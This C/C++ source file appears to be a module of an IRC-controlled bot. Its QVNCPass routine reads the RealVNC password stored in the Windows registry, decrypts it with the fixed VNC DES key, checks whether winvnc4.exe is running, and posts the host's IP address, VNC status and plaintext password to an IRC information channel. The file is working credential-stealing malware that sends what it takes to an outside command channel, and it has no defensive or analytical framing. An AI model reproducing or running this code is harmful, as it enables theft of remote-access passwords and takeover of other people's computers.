#include "include.h"
#include "rfb.h"

extern "C" {
	#include "d3des.h"
}

#ifndef NO_VNC

unsigned char fixedkey1[8] = {23,82,107,6,35,78,88,7};

char *vncDecryptPasswd(const unsigned char *encryptedPasswd) {

    unsigned int i;
    unsigned char *passwd = (unsigned char *)malloc(9);

	memcpy(passwd, encryptedPasswd, 8);

    for (i = 0; i < 8; i++) {
		passwd[i] = encryptedPasswd[i];
    }

    deskey(fixedkey1, DE1);
    des(passwd, passwd);

    passwd[8] = 0;

    return (char *)passwd;
}

BOOL CheckProcess(char *szExe) {

	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;

	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(hProcessSnap, &pe32)) {
		CloseHandle(hProcessSnap);
		return FALSE;
	}

	do {
		if (lstrcmpi(pe32.szExeFile, szExe) == 0) {
			CloseHandle(hProcessSnap);
			return TRUE;
		}
	} while (Process32Next(hProcessSnap, &pe32));

	CloseHandle(hProcessSnap);
	return FALSE;
}

unsigned long Uptime() {

	DWORD total = GetTickCount() / 1000 - 0;
	DWORD days = total / 86400;

	return (days);
}


DWORD WINAPI QVNCPass(LPVOID param) {

	char passwd[8], Buffer[MAX_LINE_SIZE]; 
	char *pw;
	char stats[128];
	HKEY Reg;
	DWORD TypePass = REG_BINARY;
	DWORD PassSize = 8;

	QVNCP v = *((QVNCP *)param);
	QVNCP *vs = (QVNCP *)param;
	vs->GotInfo = TRUE;

	int d = Uptime();

	if (d < v.Uptime) {
		ClearThread(v.ThreadNum);
		ExitThread(0);
	}

	memset(passwd, 0, sizeof(passwd));

	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\RealVNC\\WinVNC4", 0, KEY_QUERY_VALUE, &Reg);
	if (RegQueryValueEx(Reg, "Password", NULL, &TypePass, (unsigned char *)passwd, &PassSize) != 0) {
		ClearThread(v.ThreadNum);
		ExitThread(0);
	}

	pw = vncDecryptPasswd((const unsigned char *)passwd);
	strcpy(passwd, pw);
	free(pw);

	passwd[strlen(passwd)] = '\0';

	if (CheckProcess("winvnc4.exe"))
		_snprintf(stats, sizeof(stats), "ON");
	else
		_snprintf(stats, sizeof(stats), "OFF");

	_snprintf(stats, sizeof(stats), "%s (Uptime: %dd)", stats, d);

	_snprintf(Buffer, sizeof(Buffer), "VNC is %s: %s - %s", stats, GetIP(v.Sock), passwd);
	IrcPrivmsg(v.Sock, InfoChan, Buffer);
	memset(Buffer, 0, sizeof(Buffer));

	ClearThread(v.ThreadNum);
	ExitThread(0);
}

#endif
